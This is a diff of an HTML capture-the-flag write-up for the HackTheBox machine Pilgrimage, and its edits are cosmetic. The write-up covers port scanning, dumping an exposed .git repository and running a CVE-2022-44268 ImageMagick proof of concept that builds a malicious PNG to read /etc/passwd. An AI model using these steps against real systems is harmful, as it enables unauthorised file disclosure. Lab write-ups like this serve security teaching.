@@ -14,7 +14,7 @@
         <nav>
             <ul>
                 <li><a href="/">Home</a></li>
-                <li><a href="/writeups.html">Writeups</a></li>
+                <li><a href="/writeups.html">WriteUPs</a></li>
                 <li><a href="https://github.com/elswix/KL-Sunset" target="_blank">KL-Sunset</a></li>
                 <li><a href="/about.html">About me</a></li>
             </ul>
@@ -31,10 +31,10 @@
                 </ul>
             </div>
             <div class="writeup-content-main">
-                <div class="highlight"><pre><span></span><span class="n">Machine</span><span class="p">:</span> <span class="n">Pilgrimage</span>
-<span class="n">Difficult</span><span class="p">:</span> <span class="n">Easy</span>
-<span class="n">Platform</span><span class="p">:</span> <span class="n">HackTheBox</span>
-<span class="n">Release</span><span class="p">:</span> <span class="n">Released</span> <span class="n">on</span> <span class="mi">06</span><span class="o">/</span><span class="mi">24</span><span class="o">/</span><span class="mi">2023</span>
+                <div class="highlight"><pre><span></span><span class="k">Machine</span><span class="p">:</span> <span class="n">Pilgrimage</span>
+<span class="k">Difficulty</span><span class="p">:</span> <span class="n">Easy</span>
+<span class="k">Platform</span><span class="p">:</span> <span class="n">HackTheBox</span>
+<span class="k">Release</span><span class="p">:</span> <span class="n">Released</span> <span class="n">on</span> <span class="mi">06</span><span class="o">/</span><span class="mi">24</span><span class="o">/</span><span class="mi">2023</span>
 </pre></div>
 <h3><br/>About Pilgrimage</h3><br/>
 Pilgrimage is an easy difficulty machine on HackTheBox, exposing an HTTP service on port 80. Our initial step involves dumping a <code>.git</code> directory to retrieve the website's source code. Upon examination, we discovered that the website employs a vulnerable version of ImageMagick for converting uploaded images, presenting an opportunity for reading system files.<br/><br/>
@@ -45,7 +45,7 @@ The <code>root</code> user is running a script that executes a vulnerable versio
 <h3><br>Recon</br></h3><br>
 At first, let's conduct a port scan to identify open ports on the victim machine. Ports serve as the channels through which services are exposed.<br/><br/>
 To execute this scan, we will utilize the <code>nmap</code> tool:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">nmap</span> <span class="o">-</span><span class="n">p</span><span class="o">-</span> <span class="o">--</span><span class="nb">open</span> <span class="o">--</span><span class="nb">min</span><span class="o">-</span><span class="n">rate</span> <span class="mi">10000</span> <span class="mf">10.10.11.219</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">nmap</span> <span class="o">-</span><span class="n">p</span><span class="o">-</span> <span class="o">--</span><span class="nb">open</span> <span class="o">--</span><span class="nb">min</span><span class="o">-</span><span class="n">rate</span> <span class="mi">10000</span> <span class="mf">10.10.11.219</span>
 
 <span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="n">pilgrimage</span><span class="o">.</span><span class="n">htb</span> <span class="p">(</span><span class="mf">10.10.11.219</span><span class="p">)</span>
 <span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.14</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
@@ -58,7 +58,7 @@ To execute this scan, we will utilize the <code>nmap</code> tool:<br/><br/>
 
 After completing the scan, we observed that ports 80 and 22 are open on the victim machine, typically associated with HTTP and SSH services, respectively.<br/><br/>
 Understanding the open ports on the victim machine, our next step involves obtaining information about services and technologies working on these ports. Once again, we will employ <code>nmap</code> tool:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">nmap</span> <span class="o">-</span><span class="n">sCV</span> <span class="o">-</span><span class="n">p80</span><span class="p">,</span><span class="mi">22</span> <span class="mf">10.10.11.219</span> <span class="o">-</span><span class="n">oN</span> <span class="n">fullScan</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">nmap</span> <span class="o">-</span><span class="n">sCV</span> <span class="o">-</span><span class="n">p80</span><span class="p">,</span><span class="mi">22</span> <span class="mf">10.10.11.219</span> <span class="o">-</span><span class="n">oN</span> <span class="n">fullScan</span>
 
 <span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mf">10.10.11.219</span> <span class="p">(</span><span class="mf">10.10.11.219</span><span class="p">)</span>
 <span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.31</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
@@ -77,7 +77,7 @@ Understanding the open ports on the victim machine, our next step involves obtai
 
 When accessing the website via the victim machine's IP address, we immediately notice a leaked domain, <code>pilgrimage.htb</code>. Since the domain couldn't be resolved, we need to add an entry to our <code>/etc/hosts</code> file, mapping it to the IP address of the victim machine.<br/><br/>
 Once  the domain can be resolved, we will rerun the scan to identify technologies and services once again.<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">nmap</span> <span class="o">-</span><span class="n">sCV</span> <span class="o">-</span><span class="n">p80</span><span class="p">,</span><span class="mi">22</span> <span class="mf">10.10.11.219</span> <span class="o">-</span><span class="n">oN</span> <span class="n">fullScan</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">nmap</span> <span class="o">-</span><span class="n">sCV</span> <span class="o">-</span><span class="n">p80</span><span class="p">,</span><span class="mi">22</span> <span class="mf">10.10.11.219</span> <span class="o">-</span><span class="n">oN</span> <span class="n">fullScan</span>
 <span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="n">pilgrimage</span><span class="o">.</span><span class="n">htb</span> <span class="p">(</span><span class="mf">10.10.11.219</span><span class="p">)</span>
 <span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.19</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
 
@@ -105,7 +105,7 @@ Once  the domain can be resolved, we will rerun the scan to identify technologie
 As the domain is now resolvable, the <code>nmap</code> tool can conduct scans on the website. During this process, it identified a <code>.git</code> directory, suggesting a possible association with Git repositories that might be exploitable in the future.<br/><br/>
 <h3><br>Web Application</br></h3><br>
 Prior to accessing the website through our browser, I will conduct a scan to identify the technologies employed on the site. To achieve this, I will utilize the <code>whatweb</code> tool:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">whatweb</span> <span class="o">-</span><span class="n">a</span> <span class="mi">3</span> <span class="mf">10.10.11.219</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">whatweb</span> <span class="o">-</span><span class="n">a</span> <span class="mi">3</span> <span class="mf">10.10.11.219</span>
 <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10.11.219</span> <span class="p">[</span><span class="mi">301</span> <span class="n">Moved</span> <span class="n">Permanently</span><span class="p">]</span> <span class="n">Country</span><span class="p">[</span><span class="n">RESERVED</span><span class="p">][</span><span class="n">ZZ</span><span class="p">],</span> <span class="n">HTTPServer</span><span class="p">[</span><span class="n">nginx</span><span class="o">/</span><span class="mf">1.18.0</span><span class="p">],</span> <span class="n">IP</span><span class="p">[</span><span class="mf">10.10.11.219</span><span class="p">],</span> <span class="n">RedirectLocation</span><span class="p">[</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">pilgrimage</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="p">],</span> <span class="n">Title</span><span class="p">[</span><span class="mi">301</span> <span class="n">Moved</span> <span class="n">Permanently</span><span class="p">],</span> <span class="n">nginx</span><span class="p">[</span><span class="mf">1.18.0</span><span class="p">]</span>
 <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">pilgrimage</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span> <span class="p">[</span><span class="mi">200</span> <span class="n">OK</span><span class="p">]</span> <span class="n">Bootstrap</span><span class="p">,</span> <span class="n">Cookies</span><span class="p">[</span><span class="n">PHPSESSID</span><span class="p">],</span> <span class="n">Country</span><span class="p">[</span><span class="n">RESERVED</span><span class="p">][</span><span class="n">ZZ</span><span class="p">],</span> <span class="n">HTML5</span><span class="p">,</span> <span class="n">HTTPServer</span><span class="p">[</span><span class="n">nginx</span><span class="o">/</span><span class="mf">1.18.0</span><span class="p">],</span> <span class="n">IP</span><span class="p">[</span><span class="mf">10.10.11.219</span><span class="p">],</span> <span class="n">JQuery</span><span class="p">,</span> <span class="n">Script</span><span class="p">,</span> <span class="n">Title</span><span class="p">[</span><span class="n">Pilgrimage</span> <span class="o">-</span> <span class="n">Shrink</span> <span class="n">Your</span> <span class="n">Images</span><span class="p">],</span> <span class="n">nginx</span><span class="p">[</span><span class="mf">1.18.0</span><span class="p">]</span>
 </pre></div>
@@ -137,13 +137,13 @@ Once I click <code>shrink</code> bottom I got a successful response:<br/><br/>
 It displays an URL to the <code>shrunk</code> directory where the shrunked image is stored:<br/><br/>
 <img alt="" src="https://elswix.github.io/writeups/htb/easy/pilgrimage/img/10.png"/><br/><br/>
 I downloaded this image and compared the <code>md5</code> hashes to verify whether the files are different, indicating any changes or manipulation to the image.<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">md5sum</span> <span class="mi">6565</span><span class="n">d789cd6f9</span><span class="o">.</span><span class="n">png</span> <span class="n">example</span><span class="o">.</span><span class="n">png</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">md5sum</span> <span class="mi">6565</span><span class="n">d789cd6f9</span><span class="o">.</span><span class="n">png</span> <span class="n">example</span><span class="o">.</span><span class="n">png</span>
 <span class="mi">465784178831519</span><span class="n">a6c1c549ee6a54cd8</span>  <span class="mi">6565</span><span class="n">d789cd6f9</span><span class="o">.</span><span class="n">png</span>
 <span class="n">e76583dbd4c0444ac86ad343313f3c2a</span>  <span class="n">example</span><span class="o">.</span><span class="n">png</span>
 </pre></div>
 
 The <code>md5</code> hashes are different for each file, indicating a change in the <code>shrinked</code> image. Additionally, upon comparing their sizes, I observed that the <code>shrinked</code> file is smaller, confirming the successful functioning of the page.<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">du</span> <span class="o">-</span><span class="n">hc</span> <span class="mi">6565</span><span class="n">d789cd6f9</span><span class="o">.</span><span class="n">png</span> <span class="n">example</span><span class="o">.</span><span class="n">png</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">du</span> <span class="o">-</span><span class="n">hc</span> <span class="mi">6565</span><span class="n">d789cd6f9</span><span class="o">.</span><span class="n">png</span> <span class="n">example</span><span class="o">.</span><span class="n">png</span>
 <span class="mi">28</span><span class="n">K</span>  <span class="mi">6565</span><span class="n">d789cd6f9</span><span class="o">.</span><span class="n">png</span>
 <span class="mi">44</span><span class="n">K</span>  <span class="n">example</span><span class="o">.</span><span class="n">png</span>
 <span class="mi">72</span><span class="n">K</span>  <span class="n">total</span>
@@ -153,7 +153,7 @@ With this information, we are aware that the website is utilizing tools to reduc
 <h3><br>Git Dumping</br></h3><br>
 Recalling the <code>nmap</code> report, there is a <code>.git</code> directory on the website. It could be interesting to extract its contents, as we might be able to obtain the website source code.<br/><br/>
 The <a href="https://github.com/internetwache/GitTools">GitTools</a> repository contains useful tools to automate the process of extracting <code>.git</code> repositories<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">git</span> <span class="n">clone</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">github</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">internetwache</span><span class="o">/</span><span class="n">GitTools</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">git</span> <span class="n">clone</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">github</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">internetwache</span><span class="o">/</span><span class="n">GitTools</span>
 <span class="n">Cloning</span> <span class="n">into</span> <span class="s1">'GitTools'</span><span class="o">...</span>
 <span class="n">remote</span><span class="p">:</span> <span class="n">Enumerating</span> <span class="n">objects</span><span class="p">:</span> <span class="mi">242</span><span class="p">,</span> <span class="n">done</span><span class="o">.</span>
 <span class="n">remote</span><span class="p">:</span> <span class="n">Counting</span> <span class="n">objects</span><span class="p">:</span> <span class="mi">100</span><span class="o">%</span> <span class="p">(</span><span class="mi">33</span><span class="o">/</span><span class="mi">33</span><span class="p">),</span> <span class="n">done</span><span class="o">.</span>
@@ -161,11 +161,11 @@ The <a href="https://github.com/internetwache/GitTools">GitTools</a> repository 
 <span class="n">remote</span><span class="p">:</span> <span class="n">Total</span> <span class="mi">242</span> <span class="p">(</span><span class="n">delta</span> <span class="mi">9</span><span class="p">),</span> <span class="n">reused</span> <span class="mi">27</span> <span class="p">(</span><span class="n">delta</span> <span class="mi">7</span><span class="p">),</span> <span class="n">pack</span><span class="o">-</span><span class="n">reused</span> <span class="mi">209</span>
 <span class="n">Receiving</span> <span class="n">objects</span><span class="p">:</span> <span class="mi">100</span><span class="o">%</span> <span class="p">(</span><span class="mi">242</span><span class="o">/</span><span class="mi">242</span><span class="p">),</span> <span class="mf">56.46</span> <span class="n">KiB</span> <span class="o">|</span> <span class="mf">642.00</span> <span class="n">KiB</span><span class="o">/</span><span class="n">s</span><span class="p">,</span> <span class="n">done</span><span class="o">.</span>
 <span class="n">Resolving</span> <span class="n">deltas</span><span class="p">:</span> <span class="mi">100</span><span class="o">%</span> <span class="p">(</span><span class="mi">88</span><span class="o">/</span><span class="mi">88</span><span class="p">),</span> <span class="n">done</span><span class="o">.</span>
-<span class="nd">@elswix@kali</span><span class="err">$</span>
+<span class="nd">elswix@kali</span><span class="err">$</span>
 </pre></div>
 
 First, we need to use the <code>gitdumper.sh</code> tool to dump the <code>.git</code> directory:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="o">./</span><span class="n">gitdumper</span><span class="o">.</span><span class="n">sh</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="o">./</span><span class="n">gitdumper</span><span class="o">.</span><span class="n">sh</span>
 <span class="c1">###########</span>
 <span class="c1"># GitDumper is part of https://github.com/internetwache/GitTools</span>
 <span class="c1">#</span>
@@ -181,7 +181,7 @@ First, we need to use the <code>gitdumper.sh</code> tool to dump the <code>.git<
 </pre></div>
 
 We need to specify a URL and a destination directory. I will save the content in a folder named <code>Pilgrimage</code>:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">GitTools</span><span class="o">/</span><span class="n">Dumper</span><span class="o">/</span><span class="n">gitdumper</span><span class="o">.</span><span class="n">sh</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">pilgrimage</span><span class="o">.</span><span class="n">htb</span><span class="o">/.</span><span class="n">git</span><span class="o">/</span> <span class="n">Pilgrimage</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">GitTools</span><span class="o">/</span><span class="n">Dumper</span><span class="o">/</span><span class="n">gitdumper</span><span class="o">.</span><span class="n">sh</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">pilgrimage</span><span class="o">.</span><span class="n">htb</span><span class="o">/.</span><span class="n">git</span><span class="o">/</span> <span class="n">Pilgrimage</span>
 <span class="c1">###########</span>
 <span class="c1"># GitDumper is part of https://github.com/internetwache/GitTools</span>
 <span class="c1">#</span>
@@ -270,21 +270,21 @@ We need to specify a URL and a destination directory. I will save the content in
 <span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">Downloaded</span><span class="p">:</span> <span class="n">objects</span><span class="o">/</span><span class="mi">76</span><span class="o">/</span><span class="mi">76701676767670105676767672167676767010</span>
 <span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Downloaded</span><span class="p">:</span> <span class="n">objects</span><span class="o">/</span><span class="n">cd</span><span class="o">/</span><span class="mf">2774e97</span><span class="n">bfe313f2ec2b8dc8285ec90688c5adb</span>
 <span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Downloaded</span><span class="p">:</span> <span class="n">objects</span><span class="o">/</span><span class="n">fa</span><span class="o">/</span><span class="mi">175</span><span class="n">a75d40a7be5c3c5dee79b36f626de328f2e</span>
-<span class="nd">@elswix@kali</span><span class="err">$</span>
+<span class="nd">elswix@kali</span><span class="err">$</span>
 </pre></div>
 
 Now, with the <code>extractor.sh</code> tool, let's extract all files from the repository:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">GitTools</span><span class="o">/</span><span class="n">Extractor</span><span class="o">/</span><span class="n">extractor</span><span class="o">.</span><span class="n">sh</span> <span class="n">Pilgrimage</span><span class="o">/</span> <span class="n">PilgrimageSC</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">GitTools</span><span class="o">/</span><span class="n">Extractor</span><span class="o">/</span><span class="n">extractor</span><span class="o">.</span><span class="n">sh</span> <span class="n">Pilgrimage</span><span class="o">/</span> <span class="n">PilgrimageSC</span>
 </pre></div>
 
 When accessing the <code>PilgrimageSC</code> directory, we encounter the following subdirectory:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">l</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">l</span>
 <span class="n">total</span> <span class="mi">4</span>
 <span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">4</span> <span class="n">elswix</span> <span class="n">elswix</span> <span class="mi">4096</span> <span class="n">Nov</span> <span class="mi">28</span> <span class="mi">09</span><span class="p">:</span><span class="mi">34</span> <span class="mi">0</span><span class="o">-</span><span class="n">e1a40beebc7035212efdcb15476f9c994e3634a7</span>
 </pre></div>
 
 Let's access it and list its contents:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">cd</span> <span class="mi">0</span><span class="o">-</span><span class="n">e1a40beebc7035212efdcb15476f9c994e3634a7</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">cd</span> <span class="mi">0</span><span class="o">-</span><span class="n">e1a40beebc7035212efdcb15476f9c994e3634a7</span>
 <span class="n">total</span> <span class="mi">26964</span>
 <span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">6</span> <span class="n">elswix</span> <span class="n">elswix</span>     <span class="mi">4096</span> <span class="n">Nov</span> <span class="mi">28</span> <span class="mi">09</span><span class="p">:</span><span class="mi">34</span> <span class="n">assets</span>
 <span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">elswix</span> <span class="n">elswix</span>      <span class="mi">205</span> <span class="n">Nov</span> <span class="mi">28</span> <span class="mi">09</span><span class="p">:</span><span class="mi">34</span> <span class="n">commit</span><span class="o">-</span><span class="n">meta</span><span class="o">.</span><span class="n">txt</span>
@@ -352,7 +352,7 @@ Speciffically at this line, the uploaded image is being converted:<br/><br/>
 </pre></div>
 
 It is using a binary named <code>magick</code>. This binary is included in the git repository, so I found it in the current directory:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">file</span> <span class="o">./</span><span class="n">magick</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">file</span> <span class="o">./</span><span class="n">magick</span>
 <span class="n">magick</span><span class="p">:</span> <span class="n">ELF</span> <span class="mi">64</span><span class="o">-</span><span class="n">bit</span> <span class="n">LSB</span> <span class="n">executable</span><span class="p">,</span> <span class="n">x86</span><span class="o">-</span><span class="mi">64</span><span class="p">,</span> <span class="n">version</span> <span class="mi">1</span> <span class="p">(</span><span class="n">SYSV</span><span class="p">),</span> <span class="n">dynamically</span> <span class="n">linked</span><span class="p">,</span> <span class="n">interpreter</span> <span class="o">/</span><span class="n">lib64</span><span class="o">/</span><span class="n">ld</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">x86</span><span class="o">-</span><span class="mf">64.</span><span class="n">so</span><span class="mf">.2</span><span class="p">,</span> <span class="k">for</span> <span class="n">GNU</span><span class="o">/</span><span class="n">Linux</span> <span class="mf">2.6.32</span><span class="p">,</span> <span class="n">BuildID</span><span class="p">[</span><span class="n">sha1</span><span class="p">]</span><span class="o">=</span><span class="mi">9</span><span class="n">fdbc145689e0fb79cb7291203431012ae8e1911</span><span class="p">,</span> <span class="n">stripped</span>
 </pre></div>
 
@@ -386,21 +386,21 @@ Before analysing the binary, let's take a look at the <code>login.php</code> fil
 Here is leaked the database directory path and how the website is interacting with the database. At first glance, everything looks very good, as it is using secure functions for interaction.<br/><br/>
 <h3><br>ImageMagick - LFI</br></h3><br>
 Let's take a loot at the binary:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="o">./</span><span class="n">magick</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="o">./</span><span class="n">magick</span>
 <span class="n">Error</span><span class="p">:</span> <span class="n">Invalid</span> <span class="n">argument</span> <span class="ow">or</span> <span class="ow">not</span> <span class="n">enough</span> <span class="n">arguments</span>
 
 <span class="n">Usage</span><span class="p">:</span> <span class="n">magick</span> <span class="n">tool</span> <span class="p">[</span> <span class="p">{</span><span class="n">option</span><span class="p">}</span> <span class="o">|</span> <span class="p">{</span><span class="n">image</span><span class="p">}</span> <span class="o">...</span> <span class="p">]</span> <span class="p">{</span><span class="n">output_image</span><span class="p">}</span>
 <span class="n">Usage</span><span class="p">:</span> <span class="n">magick</span> <span class="p">[</span> <span class="p">{</span><span class="n">option</span><span class="p">}</span> <span class="o">|</span> <span class="p">{</span><span class="n">image</span><span class="p">}</span> <span class="o">...</span> <span class="p">]</span> <span class="p">{</span><span class="n">output_image</span><span class="p">}</span>
        <span class="n">magick</span> <span class="p">[</span> <span class="p">{</span><span class="n">option</span><span class="p">}</span> <span class="o">|</span> <span class="p">{</span><span class="n">image</span><span class="p">}</span> <span class="o">...</span> <span class="p">]</span> <span class="o">-</span><span class="n">script</span> <span class="p">{</span><span class="n">filename</span><span class="p">}</span> <span class="p">[</span> <span class="p">{</span><span class="n">script_args</span><span class="p">}</span> <span class="o">...</span><span class="p">]</span>
        <span class="n">magick</span> <span class="o">-</span><span class="n">help</span> <span class="o">|</span> <span class="o">-</span><span class="n">version</span> <span class="o">|</span> <span class="o">-</span><span class="n">usage</span> <span class="o">|</span> <span class="o">-</span><span class="nb">list</span> <span class="p">{</span><span class="n">option</span><span class="p">}</span>
-<span class="nd">@elswix@kali</span><span class="err">$</span> <span class="o">./</span><span class="n">magick</span> <span class="o">-</span><span class="n">version</span>
+<span class="nd">elswix@kali</span><span class="err">$</span> <span class="o">./</span><span class="n">magick</span> <span class="o">-</span><span class="n">version</span>
 <span class="n">Version</span><span class="p">:</span> <span class="n">ImageMagick</span> <span class="mf">7.1.0</span><span class="o">-</span><span class="mi">49</span> <span class="n">beta</span> <span class="n">Q16</span><span class="o">-</span><span class="n">HDRI</span> <span class="n">x86_64</span> <span class="n">c243c9281</span><span class="p">:</span><span class="mi">20220911</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">imagemagick</span><span class="o">.</span><span class="n">org</span>
 <span class="n">Copyright</span><span class="p">:</span> <span class="p">(</span><span class="n">C</span><span class="p">)</span> <span class="mi">1999</span> <span class="n">ImageMagick</span> <span class="n">Studio</span> <span class="n">LLC</span>
 <span class="n">License</span><span class="p">:</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">imagemagick</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">script</span><span class="o">/</span><span class="n">license</span><span class="o">.</span><span class="n">php</span>
 <span class="n">Features</span><span class="p">:</span> <span class="n">Cipher</span> <span class="n">DPC</span> <span class="n">HDRI</span> <span class="n">OpenMP</span><span class="p">(</span><span class="mf">4.5</span><span class="p">)</span> 
 <span class="n">Delegates</span> <span class="p">(</span><span class="n">built</span><span class="o">-</span><span class="ow">in</span><span class="p">):</span> <span class="n">bzlib</span> <span class="n">djvu</span> <span class="n">fontconfig</span> <span class="n">freetype</span> <span class="n">jbig</span> <span class="n">jng</span> <span class="n">jpeg</span> <span class="n">lcms</span> <span class="n">lqr</span> <span class="n">lzma</span> <span class="n">openexr</span> <span class="n">png</span> <span class="n">raqm</span> <span class="n">tiff</span> <span class="n">webp</span> <span class="n">x</span> <span class="n">xml</span> <span class="n">zlib</span>
 <span class="n">Compiler</span><span class="p">:</span> <span class="n">gcc</span> <span class="p">(</span><span class="mf">7.5</span><span class="p">)</span>
-<span class="nd">@elswix@kali</span><span class="err">$</span>
+<span class="nd">elswix@kali</span><span class="err">$</span>
 </pre></div>
 
 It is an ImageMagick binary, specifically ImageMagick version 7.1.0-49.<br/><br/>
@@ -409,7 +409,7 @@ Let's search on the internet vulnerabilities associated to this ImageMagick vers
 <img alt="" src="https://elswix.github.io/writeups/htb/easy/pilgrimage/img/11.png"/><br/><br/>
 ImageMagick 7.1.0-49 is susceptible to an Information Disclosure vulnerability. When ImageMagick processes a PNG image, such as during a resize operation, the resulting image might contain the content of any arbitrary file. This occurs if the <code>magick</code> binary has the necessary permissions to read the arbitrary file.<br/><br/>
 I found lots of LFI PoC to exploit this version of ImageMagick. I cloned this <a href="https://github.com/kljunowsky/CVE-2022-44268">repository</a> and tried to exploit this vulnerability. <br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">python3</span> <span class="n">CVE</span><span class="o">-</span><span class="mi">2022</span><span class="o">-</span><span class="mf">44268.</span><span class="n">py</span> <span class="o">-</span><span class="n">h</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">python3</span> <span class="n">CVE</span><span class="o">-</span><span class="mi">2022</span><span class="o">-</span><span class="mf">44268.</span><span class="n">py</span> <span class="o">-</span><span class="n">h</span>
 <span class="n">usage</span><span class="p">:</span> <span class="n">CVE</span><span class="o">-</span><span class="mi">2022</span><span class="o">-</span><span class="mf">44268.</span><span class="n">py</span> <span class="p">[</span><span class="o">-</span><span class="n">h</span><span class="p">]</span> <span class="p">[</span><span class="o">--</span><span class="n">url</span> <span class="n">URL</span><span class="p">]</span> <span class="p">[</span><span class="o">--</span><span class="n">image</span> <span class="n">IMAGE</span><span class="p">]</span> <span class="p">[</span><span class="o">--</span><span class="n">file</span><span class="o">-</span><span class="n">to</span><span class="o">-</span><span class="n">read</span> <span class="n">FILE_TO_READ</span><span class="p">]</span> <span class="p">[</span><span class="o">--</span><span class="n">output</span> <span class="n">OUTPUT</span><span class="p">]</span>
 
 <span class="n">Proof</span> <span class="n">of</span> <span class="n">Concept</span> <span class="n">Exploit</span> <span class="k">for</span> <span class="n">CVE</span><span class="o">-</span><span class="mi">2022</span><span class="o">-</span><span class="mi">44268</span> <span class="n">by</span> <span class="n">Milan</span> <span class="n">Jovic</span> <span class="o">-</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">shiftsecurityconsulting</span><span class="o">.</span><span class="n">com</span>
@@ -425,8 +425,8 @@ I found lots of LFI PoC to exploit this version of ImageMagick. I cloned this <a
 
 It is easy to use, first you have to create a malicious image, so we will use <code>--image</code>, <code>--file-to-read</code> and <code>--output</code> parameters. <br/><br/>
 For this, I downloaded a random PNG image from the internet and created the malicious file:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">python3</span> <span class="n">CVE</span><span class="o">-</span><span class="mi">2022</span><span class="o">-</span><span class="mf">44268.</span><span class="n">py</span> <span class="o">--</span><span class="n">image</span> <span class="n">example</span><span class="o">.</span><span class="n">png</span> <span class="o">--</span><span class="n">file</span><span class="o">-</span><span class="n">to</span><span class="o">-</span><span class="n">read</span> <span class="s2">"/etc/passwd"</span> <span class="o">--</span><span class="n">output</span> <span class="n">malicious</span><span class="o">.</span><span class="n">png</span>
-<span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">l</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">python3</span> <span class="n">CVE</span><span class="o">-</span><span class="mi">2022</span><span class="o">-</span><span class="mf">44268.</span><span class="n">py</span> <span class="o">--</span><span class="n">image</span> <span class="n">example</span><span class="o">.</span><span class="n">png</span> <span class="o">--</span><span class="n">file</span><span class="o">-</span><span class="n">to</span><span class="o">-</span><span class="n">read</span> <span class="s2">"/etc/passwd"</span> <span class="o">--</span><span class="n">output</span> <span class="n">malicious</span><span class="o">.</span><span class="n">png</span>
+<span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">l</span>
 <span class="n">total</span> <span class="mi">112</span>
